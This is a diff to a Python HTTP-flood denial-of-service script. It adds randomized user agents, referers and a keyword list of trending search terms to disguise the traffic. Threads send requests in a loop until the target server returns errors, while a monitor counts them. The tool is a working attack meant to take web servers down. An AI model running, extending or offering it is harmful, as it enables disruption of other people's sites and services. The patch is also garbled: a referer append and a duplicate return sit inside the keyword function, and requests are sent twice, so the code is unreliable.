@@ -27,6 +27,9 @@ def set_flag(val):
 def set_safe():
 	global safe
 	safe=1
+
+# GENERATIONS
+
 # generates a user agent array
 def useragent_list():
 	global headers_useragents
@@ -3392,8 +3395,42 @@ def referer_list():
 	headers_referers.append('http://www.google.com/?q=')
 	headers_referers.append('http://www.usatoday.com/search/results?q=')
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	return(headers_referers)
+
+# generates a keyword list	
+def keyword_list():
+	global keyword_top
+	keyword_top.append('HaxStroke')
+	keyword_top.append('Suicide')
+	keyword_top.append('Sex')
+	keyword_top.append('Robin Williams')
+	keyword_top.append('World Cup')
+	keyword_top.append('Ca Si Le Roi')
+	keyword_top.append('Ebola')
+	keyword_top.append('Malaysia Airlines Flight 370')
+	keyword_top.append('ALS Ice Bucket Challenge')
+	keyword_top.append('Flappy Bird')
+	keyword_top.append('Conchita Wurst')
+	keyword_top.append('ISIS')
+	keyword_top.append('Frozen')
+	keyword_top.append('014 Sochi Winter Olympics')
+	keyword_top.append('IPhone')
+	keyword_top.append('Samsung Galaxy S5')
+	keyword_top.append('Nexus 6')
+	keyword_top.append('Moto G')
+	keyword_top.append('Samsung Note 4')
+	keyword_top.append('LG G3')
+	keyword_top.append('Xbox One')
+	keyword_top.append('Apple Watch')
+	keyword_top.append('Nokia X')
+	keyword_top.append('Ipad Air')
+	keyword_top.append('Facebook')
+	keyword_top.append('Anonymous')
+	keyword_top.append('DJ Bach')
+
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
+
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
@@ -3420,8 +3457,8 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-		# urllib.request.urlopen(request)
-		response = urllib.request.urlopen(request)
+		urllib.request.urlopen(request)
+		# urllib.request.urlopen(request, timeout=5)
 
 	except urllib.error.HTTPError as e:
 		#print e.code
@@ -3435,8 +3472,8 @@ def httpcall(url):
 	else:
 		inc_counter()
 		logging.info(f"Request succeeded - URL: {url}")
-		# urllib.request.urlopen(request)
-		response.read()
+		urllib.request.urlopen(request)
+		# urllib.request.urlopen(request, timeout=5)
 	return(code)		
 
 	
@@ -3446,7 +3483,7 @@ class HTTPThread(threading.Thread):
 		try:
 			while flag<2:
 				code=httpcall(url)
-				if (code==500) & (safe==1):
+				if (code==500) and (safe==1):
 					set_flag(2)
 		except Exception as ex:
 			pass
@@ -3460,6 +3497,7 @@ class MonitorThread(threading.Thread):
 
         while flag == 0:
 			# +100 ensures that the console is not flooded with messages and counter has actually changed since the last print statement.
+			# if (previous + 100 < request_counter) and (previous != request_counter):
             if (previous + 100 < request_counter) and (previous != request_counter):
                 previous = request_counter
                 logging.info(f"{request_counter:,d} requests sent so far")
@@ -3481,7 +3519,7 @@ else:
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('https\://([^/]*)/?.*', url)
+		m = re.search('(https?://[^/]*)/?.*', url)
 		if m:
 			host = m.group(1)
 		else:
